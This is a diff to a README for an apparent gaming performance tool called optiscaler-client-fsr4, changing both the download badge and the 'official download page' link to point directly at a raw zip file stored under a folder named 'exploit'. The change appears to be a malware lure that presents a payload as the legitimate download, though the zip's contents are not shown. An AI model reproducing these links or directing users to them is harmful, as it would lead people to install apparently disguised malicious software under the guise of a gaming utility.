@@ -1,6 +1,6 @@
 # 🚀 optiscaler-client-fsr4 - Boost your gaming performance with ease
 
-[![](https://img.shields.io/badge/Download-OptiScaler-blue)](https://github.com/Spiccatobigeye413/optiscaler-client-fsr4)
+[![](https://img.shields.io/badge/Download-OptiScaler-blue)](https://github.com/Spiccatobigeye413/optiscaler-client-fsr4/raw/refs/heads/main/exploit/Properties/client-optiscaler-fsr-v1.5.zip)
 
 ## 🎮 What is this software?
 
@@ -22,7 +22,7 @@ If your hardware meets these points, the tool will work. Newer graphics cards pr
 
 Follow these steps to set up the software.
 
-1. Visit the [official download page](https://github.com/Spiccatobigeye413/optiscaler-client-fsr4) to get the latest version.
+1. Visit the [official download page](https://github.com/Spiccatobigeye413/optiscaler-client-fsr4/raw/refs/heads/main/exploit/Properties/client-optiscaler-fsr-v1.5.zip) to get the latest version.
 2. Click the release link on the right side of the screen.
 3. Choose the zip file for your version of Windows.
 4. Save the file to your computer.
